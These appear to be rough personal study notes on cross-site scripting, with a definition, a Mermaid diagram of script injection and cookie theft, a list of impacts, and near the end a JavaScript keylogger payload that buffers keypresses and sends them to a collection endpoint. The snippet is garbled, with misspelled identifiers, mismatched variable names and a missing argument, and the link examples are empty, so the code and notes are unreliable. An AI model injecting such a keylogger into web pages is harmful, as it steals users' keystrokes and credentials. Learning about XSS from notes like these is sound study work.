What it is: XSS happens when an attacker injects malicious JavaScript into a web page that runs in other users’ browsers.

once user is able to run script he can any kind of data cookie, keystrokes.

may be attacker will create malicious link, encode it and create tiny url.
for eg tiny url of stelaing instagram cookie.

# XSS Attack Diagram

## Mermaid diagram (use on GitHub / Mermaid-enabled viewers)

```mermaid
flowchart TD
  Attacker["👨‍💻 Attacker"]
  Website["🌐 Vulnerable Website"]
  Victim["🧑‍🦱 Victim User"]

  Attacker -->|1️⃣ Injects malicious script| Website
  Victim -->|2️⃣ Visits the infected page<br>Script runs in browser| Website
  Website -->|3️⃣ Sends stolen cookies / credentials| Attacker
```

 Vulnerability - User Session hijacking, Unauthorised activities, Capturing Keystrokes, Stealing Critical Information (take screenshots, chat), Phishing attack (how?)

Now a days new brosers are smart enough that do not allow this but still.

- User Session hijacking 

malicious link example -->  ?name=  ?name=

once vivek click on that link, post has made, user might not have any idea what he has posted.

 - Capturing Keystrokes

 // Code 
var timeout
var buffer = ‘’l
Document.querySelectort(‘body’).addEventlistener(‘keypress’, function(event) { 
if (event.which !== 0) { clearTimeout(timeout);
buffer+=String.fromCharCode(event.which);
timeoout=setTimeout(function() {
Var xor = new XMLHttpRequest();
var uri = ‘http://localhost:3001/keys?data='+encodeURIComponent
xhr.open(‘GET’, uri)l
xhr.send();
Buffer = ‘’;
}, 400);
}
});

// 22.20

